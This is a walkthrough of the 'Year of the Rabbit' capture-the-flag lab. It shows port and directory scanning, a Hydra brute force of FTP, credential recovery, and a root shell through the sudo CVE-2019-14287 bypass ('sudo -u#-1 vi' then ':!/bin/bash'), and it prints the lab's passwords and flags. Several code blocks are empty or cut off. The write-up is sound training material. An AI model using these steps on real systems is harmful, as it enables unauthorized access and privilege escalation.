## Getting Started

Before we've started the machine we're given the following introductory text...

> Let's have a nice gentle start to the New Year!
Can you hack into the Year of the Rabbit box without falling down a hole?
(Please ensure your volume is turned up!)

So we know at some point we'll have to listen closely to something in order to advance to the next step.

But for now our first step is to start the machine and use the ```ping``` command to ensure the target machine is up and running.

```
$ ping <IP_Address>

PING <IP_Address> (<IP_Address>) 56(84) bytes of data.
64 bytes from <IP_Address>: icmp_seq=1 ttl=61 time=171 ms
64 bytes from <IP_Address>: icmp_seq=2 ttl=61 time=169 ms
64 bytes from <IP_Address>: icmp_seq=3 ttl=61 time=170 ms
64 bytes from <IP_Address>: icmp_seq=4 ttl=61 time=168 ms
^C
--- <IP_Address> ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3005ms
rtt min/avg/max/mdev = 168.085/169.433/170.750/0.963 ms
```

Now that we've ensured connectivity we can move on to port enumeration so that we can see what kind of services are running on the target machine.

### [Back To Top](#year-of-the-rabbit "Jump To Top")

---

## Port Enumeration

In order to discover what kind of services are running on the target machine we can use ```nmap``` in aggressive mode by using the ```-A``` flag. This will return open ports, services, as well as other useful information.

```
$ nmap -A <IP_Address>

Host is up (0.17s latency).
Not shown: 997 closed ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.2
22/tcp open  ssh     OpenSSH 6.7p1 Debian 5 (protocol 2.0)
80/tcp open  http    Apache httpd 2.4.10 ((Debian))
|_http-server-header: Apache/2.4.10 (Debian)
|_http-title: Apache2 Debian Default Page: It works
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

After running the scan we can see we have 3 open ports.

* Port 21 - ```FTP``` (File Transfer Protocol)

* Port 22 - ```SSH``` (Secure Shell)

* Port 80 - ```HTTP``` (HyperText Transfer Protocol)

And we can also see the website at port 80 has the default ```Apache2``` landing page.

Our next step should be to check the page for any additional information as well as use ```GoBuster``` to find any hidden directories.

### [Back To Top](#year-of-the-rabbit "Jump To Top")

---

## Directory Scanning

Once we navigate to the website we'll see the ```Apache2 Debian Default Page```. We won't find anything useful on this page or in the HTML source code. So our next step is a directory scan using ```GoBuster``` and a wordlist like [directory-list-2.3-small.txt](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/directory-list-2.3-small.txt "Small Directory Word List").

```
$ gobuster -u <IP_Address> -w /path/to/wordlist

/assets (Status: 301)
```

After running the scan we should see a directory named ```/assets``` has been found.

## Examining Files

Once we have navigated to the newly discovered directory at ```http://<IP_Address>/assets``` we should see two files, ```RickRolled.mp4``` and ```style.css```.

![Assets Directory](./Assets/assets-directory.png "Assets Directory")

The RickRolled video is obviously Rick Astley singing "Never Gonna Give You Up", but if you listen closely you'll hear hidden information within the song. More on that later, for now all we need to do is to examine the ```style.css``` file.

Viewing the CSS source code we can find the following comment right after the ```body, html``` selector...

```css
/* Nice to see someone checking the stylesheets.
    Take a look at the page: /sup3r_s3cr3t_fl4g.php
*/
```

### [Back To Top](#year-of-the-rabbit "Jump To Top")

---

## The Rabbit Hole

Visiting the file referenced in the CSS source code (```http://<IP_Address>/sup3r_s3cr3t_fl4g.php```) we'll be greeted by a JavaScript Alert that tells us to turn off JavaScript.

![JavaScript Alert](./Assets/javascript-alert.png "JavaScript Alert Telling Us To Turn Off JavaScript")

Once we press ```OK``` we'll be RickRolled again. The site will redirect us to Rick Astley's "[Never Gonna Give You Up](https://www.youtube.com/watch?v=dQw4w9WgXcQ "Never Gonna Give You Up Song On YouTube")" song on YouTube.

If we turn off JavaScript as suggested by the alert, we'll be greeted with text that reads...

```
Love it when people block Javascript...
This is happening whether you like it or not... The hint is in the video. If you're stuck here then you're just going to have to bite the bullet!
Make sure your audio is turned up!
```

And the Rick Astley Rick Roll video is back again, this time it's the one we found earlier in the ```/assets``` folder. So wether or not we have JavaScript enabled we're stuck in a rabbit hole of Rick Rolls.

If we listen to the song, around the ```56 second mark```, we can hear the following...

```I'll put you out of your misery, you're looking in the wrong place *burp*.```

The burp at the end is a somewhat subtle reference to the ```BurpSuite``` tool used for intercepting HTTP requests.

Logically our next step should be intercepting the request to ```http://<IP_Address>/sup3r_s3cr3t_fl4g.php``` with ```BurpSuite``` but there's actually an easier way to move on from this step and that's to use the ```Network``` tab in our ```Dev Console```.

### [Back To Top](#year-of-the-rabbit "Jump To Top")

---

## The Hidden Directory

If we open our ```Developer Console``` in the browser, switch over to the ```Network``` tab, and visit ```http://<IP_Address>/sup3r_s3cr3t_fl4g.php``` we'll see that this request redirects us to ```intermediary.php?hidden_directory=/WExYY2Cv-qU``` which then redirects us to the ```/sup3r_s3cret_fl4g/``` directory.

![Network Tab Results](./Assets/network-tab-results.png "Network Tab Results")

It all happens so fast, but for a brief moment we request a file named ```intermediary.php``` and pass it the parameter ```hidden_directory``` and value ```/WExYY2Cv-qU```.

The intended way to have discovered this hidden directory was to use ```BurpSuite``` to intercept the initial request and forward it until we saw the following request being made...

```http
GET /intermediary.php?hidden_directory=/WExYY2Cv-qU HTTP/1.1
Host: <IP_Address>
User-Agent: <Your_Browser>
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
Sec-GPC: 1
DNT: 1
```

If we visit newly found directory at ```http://<IP_Address>/WExYY2Cv-qU/``` we'll find an image called ```Hot_Babe.png```.

![Hidden Directory](./Assets/intercepted-directory.png "Hidden Directory Contents")

### [Back To Top](#year-of-the-rabbit "Jump To Top")

---

## Metadata and Steganography

Once we have discovered the image at ```http://<IP_Address>/WExYY2Cv-qU/Hot_Babe.png``` we can download it for further analysis.

![Lena Soderberg](./Assets/Hot_Babe.png "Image of Lena Soderberg")

A quick side note about this image before we start extracting the metadata...

The woman in the photo is Lena SÃ¶derberg, and this image is a cropped version of the original which appeared in the November 1972 issue of Playboy magazine, where Lena was the centrefold model.

It is one of the most popular images on the internet due to it's use by scientific researchers working on image processing and the creation of the JPEG. It was also one of the first images uploaded to [ARPANET](https://en.wikipedia.org/wiki/ARPANET "ARPANet WikiPedia") and has a very long history in Computer Science and Image Processing.

There are many YouTube videos that explain the history of this image, as well as a [WikiPedia page](https://en.wikipedia.org/wiki/Lenna "WikiPedia page about Lena") and a [great article by The Atlantic](https://www.theatlantic.com/technology/archive/2016/02/lena-image-processing-playboy/461970/ "Atlantic article about Lena").

Anyways back to analyzing the image.

If we use the ```exiftool``` command on the image we'll notice a row named ```warning``` that reads "```[minor] Trailer data after PNG IEND chunk```".

```
$ exiftool Hot_Babe.png
ExifTool Version Number         : 12.40
File Name                       : Hot_Babe.png

Megapixels                      : 0.262
```

If we search the web for what this means we can find a [W3 page about PNG Chunks](https://www.w3.org/TR/PNG-Chunks.html "W3 page on PNG data chunks") which states...

> The IEND chunk must appear LAST. It marks the end of the PNG datastream. The chunk's data field is empty.

This warning in the metadata seems to tell us there's data in the file after the PNG ends.

And if we use the Linux ```strings``` command on the image and scroll up a bit we can find the string ```IEND```. This is where the PNG should end but instead there's a bunch of strings underneath. Appended to the PNG are an FTP username and a [list of possible passwords for the user](./Assets/ftp-password-list.txt "Password List").

## FTP Bruteforce

Now that we have extracted the strings from the PNG we can copy [all of the possible passwords](./Assets/ftp-password-list.txt "FTP Password TXT File") and store them in a text file.

We also know the username for the FTP server is ```ftpuser```.

So we're going to have to bruteforce the FTP server using ```Hydra``` with the ```-l``` flag followed by the username ```ftpuser```, ```-P``` followed by our password file, ```-V``` for verbose mode, and we're going to prepend the target IP address with ```ftp:```.

The command should look something like this...

```hydra -l ftpuser -P /path/to/wordlist -V ftp://<IP_Address>```

After Hydra has finished running we should see the following output...

```
[21][ftp] host: 10.10.248.204   login: ftpuser   password: 5iez1wGXKfPKQ
1 of 1 target successfully completed, 1 valid password found
```

Now we have our full credentials.

```ftpuser:5iez1wGXKfPKQ```

To connect to the FTP server we just need to run the command ```ftp <IP_Address>``` and when prompted for the username, input ```ftpuser```. For the password we'll use ```5iez1wGXKfPKQ```.

```
$ ftp <IP_Address>

220 (vsFTPd 3.0.2)
Name: ftpuser
331 Please specify the password.
Password: 5iez1wGXKfPKQ
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp>
```

Now that we're logged in to the FTP server we can list all files in the current directory with the ```ls -la``` command, which will show us only one file named ```Eli's_Creds.txt```.

```
ftp> ls -la
229 Entering Extended Passive Mode (|||22547|).
150 Here comes the directory listing.
drwxr-xr-x    2 0        0            4096 Jan 23  2020 .
drwxr-xr-x    2 0        0            4096 Jan 23  2020 ..

226 Directory send OK.
```

To download this file to our own machine we use the ```get``` command followed by the file name.

```
ftp> get Eli's_Creds.txt
local: Eli's_Creds.txt remote: Eli's_Creds.txt
229 Entering Extended Passive Mode (|||22266|).

## Esoteric Language

Once we've downloaded [Eli's_Creds.txt](./Assets/Eli's_Creds.txt "Eli's Creds Text File") on to our local machine we'll see that the file reads...

```brainfuck

```

At first this might just look like gibberish but if you spend enough time programming, eventually you'll run into [esoteric programming languages](https://en.wikipedia.org/wiki/Esoteric_programming_language "WikiPedia For Esoteric Programming Languages"). One of the most popular is called [BrainFuck](https://en.wikipedia.org/wiki/Brainfuck "Wikipedia Page For BrainFuck Programming Language"), and this is what it looks like.

In order to find out what this program outputs we can use the [brainfuck interpreter from dcode](https://www.dcode.fr/brainfuck-language "Brainfuck Interpreter"), which shows us that the program outputs the following SSH credentials...

```
User: eli
Password: DSpDiM1wAEwid
```

### [Back To Top](#year-of-the-rabbit "Jump To Top")

## Initial Foothold

Now that we have found the ```SSH``` credentials within the the ```BrainFuck``` program we can log in as the user ```eli``` with ```DSpDiM1wAEwid``` as a password, where we'll be greeted with the following...

```
$ ssh eli@<IP_Address>
eli@<IP_Address>'s password: DSpDiM1wAEwid

1 new message
Message from Root to Gwendoline:

"Gwendoline, I am not happy with you. Check our leet s3cr3t hiding place. I've left you a hidden message there"

END MESSAGE

eli@year-of-the-rabbit:~$
```

Now that we're in, we can see that ```Root``` has left a message for the ```Gwendoline``` user in their "leet s3cr3t hiding place", and if we list all contents in our current directory (```/home/eli```) we'll notice that there is no ```user.txt``` file.

```

The message we got when we first logged on mentioned the name Gwendoline, maybe the ```user.txt``` file is in her directory. Let's verify she does have an account by listing all contents of the ```/home``` directory with ```ls -la```.

```
eli@year-of-the-rabbit:~$ ls -la /home

```

Just as expected, ```user.txt``` is in Gwendoline's home directory, but we don't have the permissions to read it.

Maybe the message in Root and Gwendoline's "leet s3cr3t hiding place" can help us to horizontally escalate our privileges.

## Flag 1 - Horizontal Privilege Escalation

We know, based on the message displayed when we logged into Eli's account, that Root and Gwendoline have a place on the system where they share private messages with each other. Root referred to this place as their "leet s3cr3t hiding place". Maybe we can try to find this place by using the Linux ```find``` command.

To use the ```find``` command we have to specify in what directory to look, since we don't know where the file is we'll use ```/``` so it looks everywhere. We can use the ```-name``` option with what we think the name of the file or directory might be, in this case ```s3cr3t```. Then we'll tack on ```2> /dev/null``` to redirect all errors to the ```/dev/null``` directory.

If the command was run successfully, you should see that the "secret hiding place" was found. It's a directory at ```/usr/games```.

```
eli@year-of-the-rabbit:~$ find / -name s3cr3t 2>/dev/null

/usr/games/s3cr3t
```

Let's see what we can find in this secret hiding place by listing all contents of the ```/usr/games/s3cr3t``` directory with the ```ls -la``` command.

```
eli@year-of-the-rabbit:~$ ls -la /usr/games/s3cr3t/
total 12
drwxr-xr-x 2 root root 4096 Jan 23  2020 .
drwxr-xr-x 3 root root 4096 Jan 23  2020 ..
-rw-r--r-- 1 root root  138 Jan 23  2020 .th1s_m3ss4ag3_15_f0r_gw3nd0l1n3_0nly!
```

So here's the message referenced when we first logged in. If we would have just used ```ls``` and not ```ls -la``` we could have missed this file because all files that start with ```.``` are hidden by default.

Now let's read the file named ```.th1s_m3ss4ag3_15_f0r_gw3nd0l1n3_0nly!``` and see what we find.

```
eli@year-of-the-rabbit:~$ cat /usr/games/s3cr3t/.th1s_m3ss4ag3_15_f0r_gw3nd0l1n3_0nly\!

Your password is awful, Gwendoline. 
It should be at least 60 characters long! Not just MniVCQVhQHUNI
Honestly!

Yours sincerely
   -Root
```

After we read the file we'll find out that Gwendoline's password is ```MniVCQVhQHUNI```.

Let's ```su``` into her account and read ```user.txt```.

```
eli@year-of-the-rabbit:~$ su gwendoline
Password: MniVCQVhQHUNI
gwendoline@year-of-the-rabbit:/home/eli$
```

Now we're Gwendoline. But we're still in Eli's home directory so let's ```cd``` into ```/home/gwendoline``` and read ```user.txt```.

```
gwendoline@year-of-the-rabbit:/home/eli$ cd /home/gwendoline/

gwendoline@year-of-the-rabbit:~$ cat user.txt

THM{1107174691af9ff3681d2b5bdb5740b1589bae53}
```

## Flag 2 - Vertical Privilege Escalation

Now that we're the user ```gwendoline``` the first thing we should do is check for ```sudo``` privileges with ```sudo -l```.

```
gwendoline@year-of-the-rabbit:~$ sudo -l
Matching Defaults entries for gwendoline on year-of-the-rabbit:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User gwendoline may run the following commands on year-of-the-rabbit:
    (ALL, !root) NOPASSWD: /usr/bin/vi /home/gwendoline/user.txt
gwendoline@year-of-the-rabbit:~$ 
```

So we can run ```/usr/bin/vi``` with sudo, as any user except root (```!root```), but _only_ to open ```/home/gwendoline/user.txt```.

At first it may seem like there's nothing we can do with this, except there is a vulnerability in this version of sudo.

We can run this program as any user with sudo (except root), by specifying the user with ```sudo -u#``` followed by the user id number. We can't use root whose id number is ```0```. But if we use ```-1``` as the user id, sudo can't find the ```-1``` user so it defaults to user ```0``` (root).

Here's an article with a better explanation on [CVE-2019-14287](https://www.mend.io/resources/blog/new-vulnerability-in-sudo-cve-2019-14287/ "Article on CVE-2019-14287").

Time to execute the exploit by opening ```/home/gwendoline/user.txt``` with ```usr/bin/vi``` as the negative -1 user with sudo privileges (```sudo -u#-1```). The full command should look like this...


```sudo -u#-1 /usr/bin/vi /home/gwendoline/user.txt```

Once the ```vim``` editor has opened type ```:!/bin/bash``` to get a root shell.

Once we finish executing the command we should see the following...

```root@year-of-the-rabbit:/home/gwendoline#```

We can verify we're root with ```whoami``` and where we are with ```pwd```.

```
root@year-of-the-rabbit:/home/gwendoline# whoami
root

root@year-of-the-rabbit:/home/gwendoline# pwd
/home/gwendoline
```

Now to find the ```root.txt``` file all we need to do is list all contents of the ```/root``` directory with ```ls -la```.

```
root@year-of-the-rabbit:/home/gwendoline# ls -la /root
total 20
drwx------  2 root root 4096 Jan 23  2020 .
drwxr-xr-x 23 root root 4096 Jan 23  2020 ..
lrwxrwxrwx  1 root root    9 Jan 23  2020 .bash_history -> /dev/null
-rw-r--r--  1 root root  570 Jan 31  2010 .bashrc
-rw-r--r--  1 root root  140 Nov 19  2007 .profile
-rw-r-----  1 root root   46 Jan 23  2020 root.txt
```

Finally, once we've read the ```root.txt``` file we'll find our last flag...

```THM{8d6f163a87a1c80de27a4fd61aef0f3a0ecf9161}```
